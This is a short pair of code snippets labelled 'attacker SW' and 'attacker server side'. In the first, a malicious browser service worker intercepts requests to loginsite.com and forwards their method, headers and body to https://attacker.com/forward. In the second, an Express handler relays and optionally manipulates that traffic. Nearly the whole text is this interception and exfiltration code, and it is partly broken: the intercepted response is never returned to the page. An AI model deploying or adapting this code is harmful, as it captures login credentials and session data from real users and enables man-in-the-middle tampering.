attacker SW


self.addEventListener('fetch', (event) => {
  if (event.request.url.includes('loginsite.com')) {
    forwardRequest(event.request);
  }
});

async function forwardRequest(eventRequest) {
  const forwardUrl = `https://attacker.com/forward?url=${encodeURIComponent(eventRequest.url)}`;
  const fetchResponse = await fetch(forwardUrl, {
    method: eventRequest.method,
    headers: eventRequest.headers,
    body: eventRequest.body,
  });

  // Manipulate the response if needed
  // ...

  return fetchResponse;
}


====================================



attacker server side


app.get('/forward', async (req, res) => {
  const { url } = req.query;
  const forwardedRequest = request(url, {
    method: req.method,
    headers: req.headers,
    body: req.body,
  });

  // Forward the request to loginsite.com
  const loginsiteResponse = await request(`${url}/.well-known/proxy-api`, {
    method: req.method,
    headers: req.headers,
    body: req.body,
  });

  // Manipulate the response if needed
  // ...

  res.status(loginsiteResponse.statusCode).json(loginsiteResponse.body);
});


====================================


